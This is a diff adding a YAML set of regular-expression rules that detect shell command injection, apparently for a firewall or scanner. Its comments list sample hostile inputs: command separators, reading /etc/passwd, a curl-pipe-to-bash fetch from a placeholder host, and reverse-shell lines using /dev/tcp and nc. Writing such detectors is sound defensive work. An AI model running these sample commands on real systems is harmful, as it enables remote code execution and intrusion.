@@ -1,0 +1,150 @@
+id: command_injection_regex
+
+name: Command Injection Regex Repository
+
+version: "1.2"
+
+
+patterns:
+
+
+  # =====================================
+  # Shell command separator injection
+  #
+  # Examples:
+  # ;whoami
+  # |cat /etc/passwd
+  # &&uname -a
+  #
+  # =====================================
+
+  - id: shell_command_separator
+
+    enabled: true
+
+    regex: '(?i)(?:;|\|\||&&|\|)\s*(?:bash|sh|zsh|ksh|whoami|id|uname|cat|curl|wget|nc|netcat|netstat|ipconfig|ifconfig)\b'
+
+
+
+  # =====================================
+  # Command substitution
+  #
+  # Examples:
+  # $(whoami)
+  # `id`
+  #
+  # =====================================
+
+  - id: command_substitution
+
+    enabled: true
+
+    regex: '(?i)(?:\$\(\s*(?:bash|sh|whoami|id|uname|cat|curl|wget)[^)]*\)|`(?:bash|sh|whoami|id|uname|cat|curl|wget)[^`]*`)'
+
+
+
+
+  # =====================================
+  # Shell interpreter execution
+  #
+  # Examples:
+  # bash -c whoami
+  # sh -c id
+  #
+  # =====================================
+
+  - id: shell_interpreter_execution
+
+    enabled: true
+
+    regex: '(?i)\b(?:bash|sh|zsh|ksh)\s+(?:-c|--command)\s+[^\s]+'
+
+
+
+  # =====================================
+  # Windows command execution
+  #
+  # Examples:
+  # cmd.exe /c whoami
+  # powershell -c xxx
+  #
+  # =====================================
+
+  - id: windows_command_execution
+
+    enabled: true
+
+    regex: '(?i)\b(?:cmd(?:\.exe)?\s+/c|powershell(?:\.exe)?\s+-(?:c|command|encodedcommand))\s+'
+
+
+
+  # =====================================
+  # Dangerous command with arguments
+  #
+  # Examples:
+  # netstat -an
+  # whoami /all
+  # uname -a
+  # ps aux
+  #
+  # Notice:
+  # command alone is not enough
+  #
+  # =====================================
+
+  - id: system_command_execution
+
+    enabled: true
+
+    regex: '(?i)\b(?:whoami|uname|netstat|ifconfig|ipconfig|ps|tasklist|systeminfo)\s+(?:-[a-z]+|/[a-z]+|\w+)'
+
+
+
+
+  # =====================================
+  # Sensitive file read
+  #
+  # Examples:
+  # cat /etc/passwd
+  #
+  # =====================================
+
+  - id: sensitive_file_read
+
+    enabled: true
+
+    regex: '(?i)\b(?:cat|type|more|head|tail|less)\s+(?:/etc/(?:passwd|shadow|hosts|group)|/proc/(?:self|version)|[a-z]:\\windows\\(?:win\.ini|system32))'
+
+
+
+
+  # =====================================
+  # Remote command execution chain
+  #
+  # Examples:
+  # curl http://x.com/a.sh | bash
+  #
+  # =====================================
+
+  - id: remote_command_execution
+
+    enabled: true
+
+    regex: '(?i)(?:curl|wget)\s+[^\s]+\s*\|\s*(?:bash|sh)'
+
+
+
+  # =====================================
+  # Reverse shell
+  #
+  # Examples:
+  # bash -i >& /dev/tcp/x.x.x.x/4444
+  # nc -e /bin/sh
+  #
+  # =====================================
+
+  - id: reverse_shell
+
+    enabled: true
+
+    regex: '(?i)(?:bash\s+-i|/dev/tcp/|nc\s+(?:-e|-c)\s+)'
